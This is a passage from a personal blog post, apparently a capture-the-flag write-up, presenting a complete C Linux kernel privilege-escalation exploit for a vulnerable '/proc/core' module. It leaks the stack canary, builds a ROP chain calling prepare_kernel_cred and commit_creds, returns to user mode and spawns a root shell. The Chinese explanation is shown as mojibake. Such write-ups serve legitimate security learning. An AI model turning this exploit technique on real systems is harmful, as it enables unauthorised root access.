class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd=fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]opne kallsyms error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span> (fgets(buf,<span class="number">0x30</span>,kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds&amp;prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>)&amp;&amp;!commit_creds)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds_addr:%p\n&quot;</span>,commit_creds);</span><br><span class="line">            vmlinux_base=commit_creds<span class="number">-0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base_addr:%p&quot;</span>,vmlinux_base);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>)&amp;&amp;!prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred_addr:%p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">            vmlinux_base=prepare_kernel_cred<span class="number">-0x9cce0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred&amp;commit_creds))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]addr error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>,idx);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889c</span>,idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size :%ld\n&quot;</span>,size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open core error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">ssize_t</span> offset=vmlinux_base-raw_vmlinux_base;</span><br><span class="line">    set_off(fd,<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd,buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary=((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]canary: %p\n&quot;</span>,canary);</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        rop[i]=canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)usr_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    write(fd,rop,<span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd,<span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è„šæœ¬ä¸­æœ‰å¾ˆå¤šä¸œè¥¿å€¼å¾—æ€è€ƒå­¦ä¹ ã€‚</p>
<p><strong><strong><strong>asm</strong></strong></strong></p>
<p>è¿™æ˜¯cè¯­è¨€çš„å†…è”æ±‡ç¼–ä»£ç å…³é”®å­—ï¼Œé€šè¿‡ä»–å¯ä»¥åœ¨cè¯­è¨€å†…æ‰§è¡Œæ±‡ç¼–ä»£ç ï¼Œæ¯”å¦‚ä¸Šé¢è¿™ä¸ªå‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨mainå‡½æ•°å†…è°ƒç”¨savestatuså‡½æ•°å°±èƒ½æ‰§è¡Œè¿™æ®µæ±‡ç¼–ä»£ç äº†ã€‚ä¸è¿‡è¦æ³¨æ„åœ¨ç¼–è¯‘çš„æ—¶å€™å¾—åŠ ä¸Š-masm=intel.æˆ‘ç™¾åº¦äº†ä¸€ä¸‹å‘ç°ä»–ä»¬ç”¨å†…è”æ±‡ç¼–éƒ½æ˜¯__asm{}ï¼Œåƒè„šæœ¬é‡Œè¿™æ ·å†™è¿˜æ˜¯ä¸å¤šï¼Œç„¶åä»–ä»¬ä½¿ç”¨æ±‡ç¼–å¯¹ç¨‹åºçš„å˜é‡èµ‹å€¼éƒ½æ˜¯é‡‡ç”¨å ä½ç¬¦çš„æ–¹å¼ï¼Œè„šæœ¬é‡Œä¹Ÿç›´æ¥ç”¨å˜é‡åäº†ï¼Œå¯èƒ½æ˜¯ä»€ä¹ˆå¦ç±»çš„æ–¹å¼ğŸ˜ƒï¼Œè¿™æ®µæ±‡ç¼–çš„ä½œç”¨å°±æ˜¯è®°å½•ç”¨æˆ·æ€çš„ä¿¡æ¯ï¼Œç­‰ä¼šropè¿”å›ç”¨æˆ·æ€çš„æ—¶å€™ç”¨ã€‚</p>
<p><strong>find_symbols</strong></p>
<p>é€šè¿‡è¿™ä¸ªå‡½æ•°æ‰“å¼€tmp/kallsymsæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶è®°å½•ç€å†…æ ¸æ€çš„æ‰€æœ‰ç¬¦å·ä¿¡æ¯ä»¥åŠå¯¹åº”çš„åœ°å€ï¼Œå½“ä½¿ç”¨å‘½ä»¤è¡Œæ‰“å¼€è¿™ä¸ªæ–‡ä»¶æ˜¯è¿™æ ·çš„ï¼ˆæˆ‘éšä¾¿æˆªçš„ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ffffffff866dcbf0 t qdisc_lookup_default</span><br><span class="line">ffffffff866dcc40 T __qdisc_calculate_pkt_len</span><br><span class="line">ffffffff866dcca0 t stab_kfree_rcu</span><br><span class="line">ffffffff866dccb0 T qdisc_watchdog_init</span><br><span class="line">ffffffff866dcce0 t qdisc_watchdog</span><br><span class="line">ffffffff866dcd00 T qdisc_watchdog_cancel</span><br><span class="line">ffffffff866dcd10 T qdisc_class_hash_destroy</span><br></pre></td></tr></table></figure>

<p>åœ¨è„šæœ¬é‡Œæ˜¯0x30å­—ç¬¦è¯»ä¸€æ¬¡ï¼Œæˆ‘ä»–è„šæœ¬é‡Œè¯»çš„ä¸œè¥¿è¾“å‡ºè¯•è¯•</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffffffffb6499720 T func_ptr_is_kernel_text</span><br><span class="line"></span><br><span class="line">ffffffffb6499770 t param_array_free</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ˜¯è¿™ç§è¾“å‡ºå½¢å¼çš„ï¼Œåº”è¯¥æ˜¯æ¯ä¸€åˆ—éƒ½æ˜¯0x30ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥è¯»çš„æ—¶å€™fgets(buf,0x30,kakksyms_fd)åˆšå¥½æ˜¯è¯»ä¸€åˆ—ï¼Œç„¶åæŸ¥çœ‹æ¯ä¸€åˆ—æ˜¯å¦åŒ…å«<code>commit_creds</code>å’Œ<code>prepare_kernel_cred</code>å­—ç¬¦ä¸²ï¼Œå¦‚æœæœ‰çš„è¯å°±æŠŠå‰é¢çš„åœ°å€è¯»å‡ºæ¥ã€‚</p>
<p><strong>è®¡ç®—åœ°å€</strong></p>
<p>è®¡ç®—åœ°å€çš„æ–¹å¼ä¹Ÿå’Œç”¨æˆ·æ€ä¸ä¸€æ ·ï¼Œçœ‹è„šæœ¬çš„æ—¶å€™æ²¡çœ‹æ‡‚ï¼Œæ…¢æ…¢æ•²çš„æ—¶å€™æ‰æƒ³æ˜ç™½ï¼Œåœ¨ç”¨æˆ·æ€æˆ‘ä»¬ä¸€èˆ¬æ˜¯æ±‚å‡ºåŸºåœ°å€ç„¶ååŠ ä¸Šåç§»é‡ç¡®å®šåœ°å€ï¼Œæ±‚å‡ºåç§»é‡çš„æ–¹å¼ç±»ä¼¼<code>libc.sym[&#39;__malloc_hook&#39;]</code>ï¼ˆå¯èƒ½libcçš„é€»è¾‘åŸºåœ°å€å°±æ˜¯0ï¼‰ï¼Œä½†ä½¿ç”¨<code>elf.sym[]</code>æ±‚å†…æ ¸æŸä¸€ç¬¦å·çš„åœ°å€ï¼Œå¾—åˆ°çš„ä¸æ˜¯åç§»é‡è€Œæ˜¯é€»è¾‘åœ°å€,æ¯”å¦‚ä¸‹é¢</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.12 (default, Mar  1 2021, 11:38:31) </span><br><span class="line">[GCC 5.4.0 20160609] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; vmlinux=ELF(<span class="string">&quot;./vmlinux&quot;</span>)</span></span><br><span class="line">[*] &#x27;/home/rootzhang/kernelstudy/pwn2/give_to_player/vmlinux&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    Version:  4.15.8</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0xffffffff81000000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; hex(vmlinux.sym[<span class="string">&quot;commit_creds&quot;</span>])</span></span><br><span class="line">&#x27;0xffffffff8107fc8d&#x27;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥è¦ç®—å‡ºåç§»é‡çš„è¯è¿˜å¾—å‡å»vmlinuxçš„é€»è¾‘åŸºåœ°å€</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; hex(vmlinux.sym[<span class="string">&#x27;commit_creds&#x27;</span>] - 0xffffffff81000000)</span></span><br><span class="line">&#x27;0x9c8e0&#x27;</span><br></pre></td></tr></table></figure>

<p>åœ¨åˆ©ç”¨kallsymså¾—åˆ°commit_credsåŸºåœ°å€åå‡å»<code>&#39;0x9c8e0&#39;</code>å°±æ˜¯çœŸå®çš„è™šæ‹ŸåŸºåœ°å€äº†ï¼Œè„šæœ¬ä¸­çš„0ffsetä¸æ˜¯gadgetçš„åç§»é‡ï¼Œè€Œæ˜¯é€»è¾‘åŸºåœ°å€å’Œè™šæ‹ŸåŸºåœ°å€çš„å·®å€¼ï¼Œå†åŠ ä¸Šgadgetçš„é€»è¾‘åœ°å€å°±æ˜¯è¿™ä¸ªgadgetçš„è™šæ‹Ÿåœ°å€äº†ã€‚</p>
<p>å¯»æ‰¾gadgetçš„æ–¹æ³•å¦‚ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">æŠŠæ±‡ç¼–æå–å‡ºæ¥ç„¶ååœ¨gadgeté‡Œé¢æœç´¢</span></span><br><span class="line">objdump -d vmlinux &gt; gadget</span><br><span class="line"><span class="meta">#</span><span class="bash">æˆ‘ä¸çŸ¥é“æ€ä¹ˆé«˜æ•ˆæœç´¢ï¼Œæˆ‘æ˜¯è¿™æ ·æœçš„,æœå‡ºæ¥ä¸€å¤§å †ä¸œè¥¿ï¼Œç›®å‰åªèƒ½è‚‰çœ¼å»æ‰¾</span></span><br><span class="line">grep -E &quot;pop|ret&quot; ./gadget</span><br></pre></td></tr></table></figure>

<p><strong>è¿”å›ç”¨æˆ·æ€</strong></p>
<p>å‰é¢éƒ½æ˜¯å°å…µï¼Œå¤„ç†å®Œå°å…µåè¯¥å± å¤§é¾™äº†ã€‚</p>
<p>ä¹‹å‰æœ‰ç¨å¾®ä»‹ç»è¿‡å¦‚ä½•çŠ¶æ€åˆ‡æ¢ï¼Œæ€»ç»“èµ·æ¥å°±æ˜¯ä¸¤ä¸ªæŒ‡ä»¤ï¼Œä¸€ä¸ªæ˜¯<code>swapgs</code>ï¼Œä¸€ä¸ªæ˜¯<code>iretq</code></p>
<p>é¦–å…ˆä»‹ç»å‡ ä¸ªé‡è¦å¯„å­˜å™¨</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">csæ˜¯ä»£ç æ®µå¯„å­˜å™¨</span><br><span class="line">dsæ˜¯æ•°æ®æ®µå¯„å­˜å™¨</span><br><span class="line">ssæ˜¯å †æ ˆæ®µå¯„å­˜å™¨</span><br><span class="line">esæ˜¯æ‰©å±•æ®µå¯„å­˜å™¨</span><br><span class="line">fsæ˜¯æ ‡å¿—æ®µå¯„å­˜å™¨</span><br><span class="line">gsæ˜¯å…¨å±€æ®µå¯„å­˜å™¨</span><br></pre></td></tr></table></figure>

<p><code>swapgs</code>:è¿™ä¸ªæŒ‡ä»¤æ˜¯åˆ‡æ¢GSå¯„å­˜å™¨çš„å€¼ï¼Œå†…æ ¸æ€æˆ–è€…ç”¨æˆ·æ€çš„GSå¯„å­˜å™¨çš„å€¼å‚¨å­˜åœ¨æŸä¸ªåœ°æ–¹ï¼Œå¦‚æœè¦åˆ‡æ¢çš„è¯ï¼Œå°±å’Œè¿™ä¸ªå€¼è¿›è¡Œäº¤æ¢ã€‚</p>
<p><code>iretq</code>:æ¢å¤åˆ°ç”¨æˆ·æ§ä»¶ç»§ç»­æ‰§è¡Œã€‚å¦‚æœä½¿ç”¨ <code>iretq</code> è¿˜éœ€è¦ç»™å‡ºç”¨æˆ·ç©ºé—´çš„ä¸€äº›ä¿¡æ¯ï¼ˆCS, eflags/rflags, esp/rsp ç­‰ï¼‰,æ‰§è¡Œiretqçš„æ—¶å€™ä¼šè‡ªåŠ¨popå‡ºå››ä¸ªå€¼ï¼Œåˆ†åˆ«æ˜¯user_cs,user_rflags,user_sp,user_ss</p>
<p>æ‰€ä»¥æ¢å¤åˆ°ç”¨æˆ·æ€å¹¶æ‰§è¡Œsystem(â€œ/bin/shâ€)çš„ropè¿™æ ·æ„é€ </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">   rop[i++] = (<span class="keyword">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">   rop[i++] = user_cs;</span><br><span class="line">   rop[i++] = user_rflags;</span><br><span class="line">   rop[i++] = user_sp;</span><br><span class="line">   rop[i++] = user_ss;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­åé¢popçš„å€¼æ˜¯æˆ‘ä»¬å‰é¢é€šè¿‡å†…è”æ±‡ç¼–æ‰¾åˆ°çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">     <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">     <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">     <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">     <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">     <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line"> );</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­pushfå°±æ˜¯pushçŠ¶æ€æ ‡å¿—å¯„å­˜å™¨çš„å€¼ä¹Ÿå°±æ˜¯rflags,ç„¶åpopæ¥æ”¶ã€‚</p>
<p><strong>å¼€å§‹è°ƒè¯•</strong></p>
<p>è°ƒè¯•è¿‡ç¨‹å°±çœç•¥äº†ï¼Œä¸è¿‡æˆ‘ç»ˆäºææ˜ç™½è¿™ä¸ªropæœ€éš¾ç†è§£çš„åœ°æ–¹äº†ï¼ŒåŸæ¥callä¼šå…ˆæŠŠä¸€ä¸ªåœ°å€å‹æ ˆç„¶åæ‰å»æ‰§è¡Œåœ°å€ï¼Œæ‰€ä»¥çš„pop rcx.æ‰«å™¶ï¼Œä¸è¿‡æœ‰ä¸€è¯´ä¸€è°ƒè¯•å†…æ ¸gdbè¿è¡Œçš„çœŸçš„æ…¢ã€‚</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä»Šå¤©äº†è§£åˆ°äº†å¾ˆå¤šçŸ¥è¯†ï¼Œæ„Ÿè§‰è¿˜ä¸é”™ï¼Œå“¦å¯¹æœ€è¿‘å†™çŸ¥è¯†æ€»ç»“çš„æ—¶å€™æ€»å–œæ¬¢å¬ç€ä¸€é¦–å†™</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åˆ—è½¦ç²—ç³™è€Œè¿‡</span><br><span class="line">å«é†’æˆ‘é¢‘é¢‘å¤±ç¥</span><br><span class="line">---æˆ‘ä¼šåœ¨æ¯ä¸ªæœ‰æ„ä¹‰çš„æ—¶è¾°</span><br></pre></td></tr></table></figure>




    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/02/10/kernel-babydirver/" rel="prev" title="kernel-babydirver">
      <i class="fa fa-chevron-left"></i> kernel-babydirver
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/03/02/SUSCTF/" rel="next" title="SUSCTF">
      SUSCTF <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#kernelrop"><span class="nav-number">1.</span> <span class="nav-text">kernelrop</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">é¢˜ç›®åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90"><span class="nav-number">1.1.1.</span> <span class="nav-text">è„šæœ¬åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ko%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">.koæ–‡ä»¶åˆ†æ</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">æ¼æ´åˆ©ç”¨</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.3.</span> <span class="nav-text">æ€»ç»“</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">rootzhang</p>
  <div class="site-description" itemprop="description">æˆ‘çš„åšå®¢</div>
</div>
